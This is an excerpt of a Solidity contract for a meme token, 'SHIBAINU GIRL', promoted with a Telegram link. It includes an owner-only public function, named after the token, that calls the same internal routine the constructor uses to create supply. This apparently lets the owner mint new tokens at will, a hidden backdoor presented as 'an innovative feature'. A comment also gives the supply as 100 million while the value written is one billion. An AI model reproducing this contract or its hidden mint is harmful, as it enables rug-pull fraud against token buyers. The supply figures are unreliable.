...
//
// $Shibainugirl proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/ShibaInugirl
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function shibainugirl(uint256 amount) public onlyOwner {
    _shibainugirl(msg.sender, amount);
    }
    ...
    function _shibainugirl(address account, uint256 amount) internal virtual {
...
contract SHIBAINUGIRL is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SHIBAINU GIRL", "SIG") {
        _shibainugirl(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}